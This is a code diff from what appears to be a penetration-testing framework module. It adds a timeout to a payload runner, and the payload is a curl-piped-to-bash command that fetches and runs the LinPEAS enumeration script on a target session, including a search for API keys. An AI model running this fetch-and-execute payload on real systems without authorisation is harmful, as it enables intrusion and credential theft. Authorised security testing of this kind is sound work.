@@ -99,7 +99,7 @@ class Module(BaseModule):
                     payload = 'curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20240218-68f9adb3/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex | tee /tmp/linpeas.txt'
                     session.log("payload loaded and ready")
                     result = run_base64_payload(
-                        session=session, payload=payload, log_name="payload_linpeas")
+                        session=session, payload=payload, log_name="payload_linpeas", timeout=900)
                     session.log(result)
                 except Exception as e:
                     session.log(f"Enumeration failed: {e}")
